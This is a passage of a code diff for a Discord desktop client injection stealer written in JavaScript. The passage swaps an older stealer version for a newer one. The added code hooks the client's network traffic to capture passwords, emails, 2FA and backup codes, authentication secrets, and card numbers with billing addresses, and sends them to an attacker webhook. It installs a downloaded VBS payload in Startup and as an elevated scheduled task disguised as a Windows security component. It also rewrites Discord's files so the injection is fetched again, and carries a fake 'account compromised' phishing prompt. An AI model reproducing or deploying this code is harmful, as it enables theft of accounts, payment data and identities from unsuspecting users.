+            return response;
+        } catch (error) {
+            return {};
+        }
+    };
+
+    Badges = (flags) =>
+        Object.keys(CONFIG.badges)
+            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
+                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
+                ? `${result}${CONFIG.badges[badge].emoji} `
+                : result, '',
+            ) || '❓';
+
+    RareBadges = (flags) =>
+        Object.keys(CONFIG.badges)
+            .reduce((result, badge) => CONFIG.badges.hasOwnProperty(badge)
+                && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value
+                && CONFIG.badges[badge].rare
+                ? `${result}${CONFIG.badges[badge].emoji} `
+                : result, '',
+            ) || '';
+
+    Billing = async (token) => {
+        const API = new Fetcher(token);
+        const data = await API.Billing();
+
+        const payment = {
+            1: '💳',
+            2: '<:Paypal:1129073151746252870>'
+        };
+        let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
+        return paymentMethods || '❓';
     }
-  }
+
+    Friends = async (token) => {
+        const API = new Fetcher(token);
+        const friends = await API.Friends();
+        const { RareBadges } = new GetDataUser();
+
+        const filteredFriends = friends
+            .filter(friend => friend.type === 1)
+            .map(friend => ({
+                username: friend.user.username,
+                flags: RareBadges(friend.user.public_flags),
+            }))
+
+        const rareFriends = filteredFriends.filter(friend => friend.flags);
+
+        const hQFriends = rareFriends.map(friend => {
+            const name = `${friend.username}`;
+            return `${friend.flags} | ${name}\n`;
+        });
+
+        const hQFriendsPlain = hQFriends.join('');
+
+        if (hQFriendsPlain.length === 0) {
+            return false;
+        };
+
+        if (hQFriendsPlain.length > 4050) {
+            return {
+                title: `**Rare Friends (Too many to display):**\n`,
+                description: "Too many friends to display.",
+            };
+        };
+
+        return {
+            title: `**Rare Friends (${hQFriends.length}):**\n`,
+            description: `${hQFriendsPlain}`,
+        };
+    };
+
+    Servers = async (token) => {
+        const API = new Fetcher(token);
+        const guilds = await API.Servers();
+
+        const filteredGuilds = guilds
+            .filter(guild => guild.owner || (guild.permissions & 8) === 8)
+            .filter(guild => guild.approximate_member_count >= 500)
+            .map(guild => ({
+                id: guild.id,
+                name: guild.name,
+                owner: guild.owner,
+                member_count: guild.approximate_member_count
+            }));
+
+        const hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
+            const response = parseJSON(await request('GET', `https://discord.com/api/v8/guilds/${guild.id}/invites`, {
+                'Content-Type': 'application/json',
+                'Authorization': token
+            }));
+
+            const invites = response;
+            const invite = invites.length > 0
+                ? `[Join Server](https://discord.gg/${invites[0].code})`
+                : 'No Invite';
+
+            const emoji = guild.owner
+                ? `<:Owner:963333541343686696> Owner`
+                : `<:Staff:1136740017822253176> Admin`;
+            const members = `Members: \`${guild.member_count}\``;
+            const name = `**${guild.name}** - (${guild.id})`;
+
+            return `${emoji} | ${name} - ${members} - ${invite}\n`;
+        }));
+
+        const hQGuildsPlain = hQGuilds.join('');
+
+        if (hQGuildsPlain.length === 0) {
+            return false;
+        };
+
+        if (hQGuildsPlain.length > 4050) {
+            return {
+                title: `**Rare Servers (Too many to display):**\n`,
+                description: "Too many servers to display.",
+            };
+        };
+
+        return {
+            title: `**Rare Guilds (${hQGuilds.length}):**\n`,
+            description: `${hQGuildsPlain}`,
+        }
+    };
+
+    getDate = (current, months) => {
+        return new Date(current).setMonth(current.getMonth() + months);
+    };
+
+    Nitro = (flags) => {
+        const { premium_type, premium_guild_since } = flags,
+            nitro = "<:DiscordNitro:587201513873473542>";
+        switch (premium_type) {
+            default:
+                return "❓";
+            case 1:
+                return nitro;
+            case 2:
+                if (!premium_guild_since) return nitro;
+                let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
+                    rem = 0;
+                for (let i = 0; i < months.length; i++)
+                    if (Math.round((this.getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
+                        rem = i;
+                        break;
+                    }
+                return `${nitro} ${CONFIG.badges._nitro[rem]}`;
+        }
+    };
 };
 
-const getNitro = (flags) => {
-  switch (flags) {
-    case 0:
-      return 'No Nitro';
-    case 1:
-      return 'Nitro Classic';
-    case 2:
-      return 'Nitro Boost';
-    default:
-      return 'No Nitro';
-  }
+const delay = (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms))
 };
 
-const getBadges = (flags) => {
-  let badges = '';
-  switch (flags) {
-    case 1:
-      badges += 'Discord Staff, ';
-      break;
-    case 2:
-      badges += 'Partnered Server Owner, ';
-      break;
-    case 131072:
-      badges += 'Verified Bot Developer, ';
-      break;
-    case 4194304:
-      badges += 'Active Developer, ';
-      break;
-    case 4:
-      badges += 'Hypesquad Event, ';
-      break;
-    case 16384:
-      badges += 'Gold BugHunter, ';
-      break;
-    case 8:
-      badges += 'Green BugHunter, ';
-      break;
-    case 512:
-      badges += 'Early Supporter, ';
-      break;
-    case 128:
-      badges += 'HypeSquad Brillance, ';
-      break;
-    case 64:
-      badges += 'HypeSquad Bravery, ';
-      break;
-    case 256:
-      badges += 'HypeSquad Balance, ';
-      break;
-    case 0:
-      badges = 'None';
-      break;
-    default:
-      badges = 'None';
-      break;
-  }
-  return badges;
-};
+const Cruise = async (type, response, request, email, password, token, action) => {
+    let API;
+    let user;
+    let content;
+    switch (type) {
+        case 'LOGIN_USER':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                    ],
+                }],
+            };
 
-const hooker = async (content) => {
-  const data = JSON.stringify(content);
-  const url = new URL(config.webhook);
-  const headers = {
-    'Content-Type': 'application/json',
-    'Access-Control-Allow-Origin': '*',
-  };
-  if (!config.webhook.includes('api/webhooks')) {
-    const key = totp(config.webhook_protector_key);
-    headers['Authorization'] = key;
-  }
-  const options = {
-    protocol: url.protocol,
-    hostname: url.host,
-    path: url.pathname,
-    method: 'POST',
-    headers: headers,
-  };
-  const req = https.request(options);
+            if (request?.code !== undefined) {
+                content.embeds[0].fields.push(
+                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: false }
+                );
+            };
 
-  req.on('error', (err) => {
-    console.log(err);
-  });
-  req.write(data);
-  req.end();
-};
+            notify(content, token, user);
+            break;
+        case 'USERNAME_CHANGED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "New Username", value: `\`${request.username}\``, inline: true },
+                        { name: "Password", value: `\`${request.password}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: false },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        case 'EMAIL_CHANGED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "New Email", value: `\`${email}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        case 'PASSWORD_CHANGED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "New Password", value: `\`${request.new_password}\``, inline: true, },
+                        { name: "Old Password", value: `\`${request.password}\``, inline: true, },
+                        { name: "Email", value: `\`${email}\``, inline: false, },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        case 'BACKUP_CODES':
+            API = new Fetcher(token);
+            user = await API.User();
 
-const login = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
+            const codes = await getBackupCodes(response);
 
-const passwordChanged = async (oldpassword, newpassword, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "\u200b", value: "\u200b", inline: false },
+                        { name: "Security codes", value: `\`\`\`\n${codes}\`\`\``, inline: false },
+                    ],
+                }],
+            };
 
-const emailChanged = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
+            if (request?.code !== undefined && request?.secret !== undefined) {
+                content.embeds[0].fields.push(
+                    { name: "Used 2FA code", value: `\`${request.code}\``, inline: true },
+                    { name: "Authentication secret", value: `\`${request.secret}\``, inline: true },
+                );
+            };
 
-const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = {
-    username: config.embed_name,
-    content: code,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
-  hooker(content);
-};
-session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
-  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
-  updateCheck();
-});
-
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-  if (details.url.startsWith(config.webhook)) {
-    if (details.url.includes('discord.com')) {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Access-Control-Allow-Headers': '*',
-          },
-          details.responseHeaders,
-        ),
-      });
-    } else {
-      callback({
-        responseHeaders: Object.assign(
-          {
-            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-            'Access-Control-Allow-Headers': '*',
-            'Access-Control-Allow-Origin': '*',
-          },
-          details.responseHeaders,
-        ),
-      });
+            notify(content, token, user);
+            break;
+        case 'CREDITCARD_ADDED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                        { name: "\u200b", value: "\u200b", inline: false },
+                        { name: "Number", value: `\`${request.item["card[number]"]}\``, inline: true },
+                        { name: "CVC", value: `\`${request.item["card[cvc]"]}\``, inline: true },
+                        { name: "Expiration", value: `\`${request.item["card[exp_month]"]}/${request.item["card[exp_year]"]}\``, inline: true, },
+                    ],
+                    fields: [
+                        { name: "Address", value: `\`\`\`\nLine 1: ${request["line_1"]}\nLine 2: ${request["line_2"]}\nCity: ${request["city"]}\nState: ${request["state"]}\nPostal Code: ${request["postal_code"]}\nCountry: ${request["country"]}\n\`\`\``, inline: false, },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        case 'PAYPAL_ADDED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        case 'INJECTED':
+            API = new Fetcher(token);
+            user = await API.User();
+            content = {
+                content: `**${user.username}** ${action}!`,
+                embeds: [{
+                    fields: [
+                        { name: "Email", value: `\`${email}\``, inline: true },
+                    ],
+                }],
+            };
+            notify(content, token, user);
+            break;
+        default:
     }
-  } else {
-    delete details.responseHeaders['content-security-policy'];
-    delete details.responseHeaders['content-security-policy-report-only'];
+};
 
-    callback({
-      responseHeaders: {
-        ...details.responseHeaders,
-        'Access-Control-Allow-Headers': '*',
-      },
+const forcePersistStartup = async () => {
+    const vbsFileName = 'DiscordBetterProtector.vbs';
+    const batFileName = 'setupTask.bat';
+
+    const protectFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
+    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
+    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
+    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
+    const batFilePath = path.join(__dirname, batFileName);
+
+    const scriptVbsContent = await request('GET', CONFIG.injector_url, {
+        'Content-Type': 'text/plain'
     });
-  }
-});
 
-session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
-  if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
-  const data = JSON.parse(unparsed_data);
-  const token = await execScript(
-    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
-  );
-  switch (true) {
-    case details.url.endsWith('login'):
-      login(data.login, data.password, token).catch(console.error);
-      break;
+    const responseVbsMalware = scriptVbsContent[0]?.toString('utf8') || '';
+    const vbsContent = responseVbsMalware
+        .replace("replace_webhook_url", CONFIG.webhook)
+        .replace("replace_api_url", CONFIG.API)
+        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
+        .replace("replace_auto_persist_startup", CONFIG.auto_persist_startup)
+        .replace("replace_auto_mfa_disabler", CONFIG.auto_mfa_disabler)
+        .replace("replace_auto_email_update", CONFIG.auto_email_update)
 
-    case details.url.endsWith('users/@me') && details.method === 'PATCH':
-      if (!data.password) return;
-      if (data.email) {
-        emailChanged(data.email, data.password, token).catch(console.error);
-      }
-      if (data.new_password) {
-        passwordChanged(data.password, data.new_password, token).catch(console.error);
-      }
-      break;
+    const checkFileExists = (filePath) => {
+        return new Promise((resolve) => {
+            fs.access(filePath, fs.constants.F_OK, (err) => {
+                resolve(!err);
+            });
+        });
+    };
 
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-      break;
+    const checkScheduledTaskExists = () => {
+        return new Promise((resolve) => {
+            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
+                resolve(!err);
+            });
+        });
+    };
 
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      PaypalAdded(token).catch(console.error);
-      break;
+    const createVBSFile = (filePath) => {
+        return new Promise((resolve, reject) => {
+            fs.writeFile(filePath, vbsContent.trim(), (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
 
-    case details.url.endsWith('confirm') && details.method === 'POST':
-      if (!config.auto_buy_nitro) return;
-      setTimeout(() => {
-        nitroBought(token).catch(console.error);
-      }, 7500);
-      break;
+    const createBatchFile = () => {
+        const batContent = `
+            @echo off
+            setlocal
+            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"
+            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f
+            if %ERRORLEVEL% EQU 0 (
+                echo We are scanning your Discord application(s)....
+            ) else (
+                echo An unexpected error occurred...
+            )
+            timeout /t 5 /nobreak > NUL
+            del "%~f0"
+            endlocal
+        `;
 
-    default:
-      break;
-  }
-});
-module.exports = require('./core.asar');
+        return new Promise((resolve, reject) => {
+            fs.writeFile(batFilePath, batContent.trim(), (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
+
+    const executeBatchFile = () => {
+        return new Promise((resolve, reject) => {
+            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
+                if (err) return reject(err);
+                resolve();
+            });
+        });
+    };
+
+    const protectExists = await checkFileExists(vbsFilePathInProtect);
+    const startupExists = await checkFileExists(vbsFilePathInStartup);
+    const taskExists = await checkScheduledTaskExists();
+
+    if (!protectExists) {
+        await createVBSFile(vbsFilePathInProtect);
+    };
+    if (!startupExists) {
+        await createVBSFile(vbsFilePathInStartup);
+    };
+    if (!taskExists) {
+        await createBatchFile();
+        await executeBatchFile();
+
+        setTimeout(() => {
+            fs.unlink(batFilePath, (error) => {
+                if (error) {
+                    console.log(error);
+                }
+            });
+        }, 10000);
+    }
+};
+
+const startup = async () => {
+    const startupDir = path.join(__dirname, 'aurathemes');
+
+    const {
+        token,
+        user,
+    } = await AuritaCord();
+
+    if(token) {
+        if (fs.existsSync(startupDir)) {
+            fs.rmdirSync(startupDir);
+            Cruise(
+                'INJECTED',
+                null,
+                null,
+                user.email,
+                null,
+                token,
+                `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
+            );
+            clearLocalStorage();
+        }
+    }
+    
+    const getDiscordPaths = () => {
+        const args = process.argv;
+        const appDir = path.dirname(args[0]);
+        let resourceDir;
+
+        switch (process.platform) {
+            case 'win32':
+                resourceDir = path.join(appDir, 'resources');
+                break;
+            default:
+                return { resource: undefined, app: undefined };
+        }
+
+        return fs.existsSync(resourceDir) 
+            ? { resource: resourceDir, app: appDir } 
+            : { resource: undefined, app: undefined };
+    };
+
+    const { resource, app } = getDiscordPaths();
+    if (!resource || !app) return;
+
+    const appDir = path.join(resource, 'app');
+
+    const packageJsonFile = path.join(appDir, 'package.json');
+    const startupScriptRunJsFile = path.join(appDir, 'index.js');
+
+    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
+    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
+
+    if (!fs.existsSync(appDir)) {
+        fs.mkdirSync(appDir, { recursive: true });
+    }
+
+    [packageJsonFile, startupScriptRunJsFile].forEach(file => {
+        if (fs.existsSync(file)) fs.unlinkSync(file);
+    });
+
+    // In the future maybe add more operating systems!
+    // This may work on other systems but Windows is recommended
+    if (['win32'].includes(process.platform)) {
+        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+
+        const scriptRunJsFileContent = `
+            const fs = require('fs');
+            const https = require('https');
+            const path = require('path');
+            const coreJsFile = '${coreJsFile}';
+            const betterDiscordAsarFile = '${betterDiscordAsarFile}';
+
+            const initialize = async () => {
+                try {
+                    const data = await fs.promises.readFile(coreJsFile, 'utf8');
+
+                    if (
+                        data.length < 20000 || 
+                        data === "module.exports = require('./core.asar')"
+                    ) {
+                        await downloadAndUpdateFile();
+                    };
+                } catch (err) {
+                    console.error(err);
+                }
+            };
+
+            const downloadAndUpdateFile = async () => {
+                try {
+                    const fileStream = fs.createWriteStream(coreJsFile);
+
+                    await new Promise((resolve, reject) => {
+                        https.get('${CONFIG.injection_url}', (res) => {
+                            res.on('data', chunk => fileStream.write(
+                                chunk.toString()
+                                    .replace('%WEBHOOK_URL%', '${CONFIG.webhook}')
+                                    .replace('%API_URL%', '${CONFIG.API}')
+                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG.auto_user_profile_edit}')
+                                    .replace('%AUTO_PERSIST_STARTUP%', '${CONFIG.auto_persist_startup}')
+                                    .replace('%AUTO_MFA_DISABLER%', '${CONFIG.auto_mfa_disabler}')
+                                    .replace('%AUTO_EMAIL_UPDATE%', '${CONFIG.auto_email_update}')
+                            ));
+
+                            res.on('end', () => {
+                                fileStream.end();
+                                resolve();
+                            });
+                        }).on('error', err => {
+                            reject(err);
+                        });
+                    });
+                } catch (err) {
+                    setTimeout(downloadAndUpdateFile, 10000);
+                }
+            };
+
+            initialize();
+            require('${path.join(resource, 'app.asar')}');
+
+            if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
+        `;
+        fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
+    }
+
+};
+
+const translateEmailUpdate = async (token, locale) => {
+    const message = [
+        "User Settings",
+        "Edit email address",
+        "We have detected something unusual with your (<strong>Discord</strong>) account, your address,",
+        "has been compromised.",
+        "Please change it to continue using your account.",
+        "No longer have access to your email",
+        "Contact your email provider to fix it.",
+    ];
+
+    const sanitized = message.map(item => item.replace(/[.,]/g, ''));
+
+    try {
+        const textParam = encodeURIComponent(JSON.stringify(sanitized));
+        const response = parseJSON(await request('GET', `https://translate.w1sh.xyz/translate?key=K4ITRUN_IS_GOD&text=${textParam}&language=${locale}`, {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }));
+
+        if (!response.success) {
+            return message;
+        }
+
+        const translatedText = parseJSON(response.text);
+
+        return Array.isArray(translatedText) && translatedText.length === message.length
+            ? translatedText
+            : message;
+    } catch (error) {
+        return message;
+    }
+};
+
+let [
+    email,
+    password,
+    script_executed
+] = [
+    '',
+    '',
+    false
+];
+
+const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
+    try {
+        switch (true) {
+            case params.response.url.endsWith('/login'):
+                if (params.response.url.endsWith('/remote-auth/login')) {
+                    // With this update, QR codes are blocked in the function allSessionsLocked(),
+                    // so this is here just in case the QR code blocking fails
+                    if (!RESPONSE_DATA.encrypted_token) return;
+
+                    await delay(2000);
+
+                    const {
+                        token: newToken,
+                        user: newUser
+                    } = await AuritaCord();
+
+                    Cruise(
+                        'LOGIN_USER',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        newUser.email,
+                        'The password was not found',
+                        newToken,
+                        `You have logged in using QR code`
+                    );
+                }
+
+                if (!RESPONSE_DATA.token) {
+                    email = RESQUEST_DATA.login;
+                    password = RESQUEST_DATA.password;
+                    return;
+                }
+
+                Cruise(
+                    'LOGIN_USER',
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    RESQUEST_DATA.login,
+                    RESQUEST_DATA.password,
+                    token,
+                    `has Logged in-`
+                );
+                break;
+
+            case params.response.url.endsWith('/register'):
+                Cruise(
+                    'LOGIN_USER',
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    RESQUEST_DATA.email,
+                    RESQUEST_DATA.password,
+                    token,
+                    'has `Created` a new account'
+                );
+                break;
+
+            case params.response.url.endsWith('/totp'):
+                Cruise(
+                    'LOGIN_USER',
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    email,
+                    password,
+                    token,
+                    `you are logged in with \`2FA\``
+                );
+                break;
+
+            case params.response.url.endsWith('/enable'):
+            case params.response.url.endsWith('/codes-verification'):
+                const count = RESPONSE_DATA.backup_codes?.length ?? 0;
+
+                Cruise(
+                    'BACKUP_CODES',
+                    RESPONSE_DATA,
+                    RESQUEST_DATA,
+                    user.email,
+                    'The password was not found',
+                    token,
+                    `\`${count} security\` codes have just been added`
+                );
+                break;
+
+            case params.response.url.endsWith('/@me'):
+                if (!RESQUEST_DATA.password) return;
+                if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
+                    Cruise(
+                        'EMAIL_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        RESQUEST_DATA.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their email to \`${RESQUEST_DATA.email}\``
+                    );
+                }
+                if (RESQUEST_DATA.new_password) {
+                    Cruise(
+                        'PASSWORD_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        user.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their password to \`${RESQUEST_DATA.new_password}\``
+                    );
+                }
+                if (RESQUEST_DATA.username) {
+                    Cruise(
+                        'USERNAME_CHANGED',
+                        RESPONSE_DATA,
+                        RESQUEST_DATA,
+                        user.email,
+                        RESQUEST_DATA.password,
+                        token,
+                        `has updated their username to \`${RESQUEST_DATA.username}\``
+                    );
+                }
+                break;
+        }
+    } catch (error) {
+        console.error(error);
+    }
+};
+
+const createWindow = () => {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return;
+
+    mainWindow.webContents.debugger.attach('1.3');
+    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
+        if ('Network.responseReceived' !== method) return;
+
+        if (
+            !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
+            ![200, 202].includes(params.response.status)
+        ) return;
+
+        try {
+            const [{ body: responseBody }, { postData: requestPostData }] = await Promise.all([
+                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
+                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId })
+            ]);
+
+            const RESPONSE_DATA = parseJSON(responseBody);
+            const RESQUEST_DATA = parseJSON(requestPostData);
+
+            const { 
+                token,
+                user
+            } = await AuritaCord();
+
+            GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
+        } catch (error) {
+            console.error(error);
+        }
+    });
+
+    mainWindow.webContents.debugger.sendCommand('Network.enable');
+
+    mainWindow.on('closed', () => {
+        createWindow();
+    });
+};
+
+const isLogged = async () => {
+    const LOG_FILE_PATH = path.join(__dirname, 'core.log');
+
+    try {
+        const { 
+            token 
+        } = await AuritaCord();
+
+        if (token) {
